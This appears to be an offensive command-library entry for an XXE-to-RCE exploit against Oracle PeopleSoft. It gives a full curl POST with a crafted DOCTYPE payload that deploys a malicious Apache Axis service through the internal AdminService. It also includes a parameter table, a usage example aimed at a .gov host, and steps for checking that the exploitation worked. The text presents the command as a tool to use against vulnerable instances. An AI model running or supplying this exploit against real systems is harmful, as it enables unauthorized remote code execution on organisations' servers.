---
data: >-
  curl -X POST https://target-domain/PSIGW/PeopleSoftServiceListeningConnector
  -H "Host: target-domain" -H "Content-Type: application/xml" -H
  "Content-Length: 608" -d '<!DOCTYPE a PUBLIC "-//B/A/EN"
  "http://localhost:80/pspc/services/AdminService?method=!--><ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/"><ns1:service name="h1testservice"
  provider="java:RPC"><ns1:parameter name="className"
  value="org.apache.pluto.portalImpl.Deploy"/><ns1:parameter
  name="allowedMethods" value="*"/></ns1:service></ns1:deployment>'
tags:
  - xxe
  - rce
  - peoplesoft
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:25.041Z'
id: 2a8a5ffb-9d4d-4131-8733-11e876c1a48e
verified: false
validated: true
submitted: true
---
# PeopleSoft-XXE-Service-Deployment

## Command

```bash
curl -X POST https://target-domain/PSIGW/PeopleSoftServiceListeningConnector \
  -H "Host: target-domain" \
  -H "Content-Type: application/xml" \
  -H "Content-Length: 608" \
  -d '<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=!--><ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java" xmlns:ns1="http://xml.apache.org/axis/wsdd/"><ns1:service name="h1testservice" provider="java:RPC"><ns1:parameter name="className" value="org.apache.pluto.portalImpl.Deploy"/><ns1:parameter name="allowedMethods" value="*"/></ns1:service></ns1:deployment>'
```

## Description

This command exploits an XXE vulnerability in Oracle PeopleSoft by sending a crafted XML payload via POST to deploy a malicious Apache Axis service, enabling RCE. Use it against vulnerable PeopleSoft instances to gain internal access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `https://target-domain/PSIGW/PeopleSoftServiceListeningConnector` | Target endpoint URL | Yes |
| `-H "Host: target-domain"` | Sets the Host header | Yes |
| `-H "Content-Type: application/xml"` | Declares XML content type | Yes |
| `-H "Content-Length: 608"` | Specifies payload length | Yes |
| `-d '...' ` | The XXE payload with DOCTYPE exploiting localhost AdminService | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.gov/PSIGW/PeopleSoftServiceListeningConnector -H "Content-Type: application/xml" -d '<!DOCTYPE ...>'
```

### Advanced Usage

Replace target-domain with the actual host and adjust Content-Length if modifying the payload.

## Expected Output

HTTP 200 OK response from the server, with no XML parsing errors, indicating successful exploitation and service deployment. Follow up by accessing /pspc/services/h1testservice to verify.

## Related

- [[procedures/Exploit-XXE-in-PeopleSoft-for-Service-Deployment]]
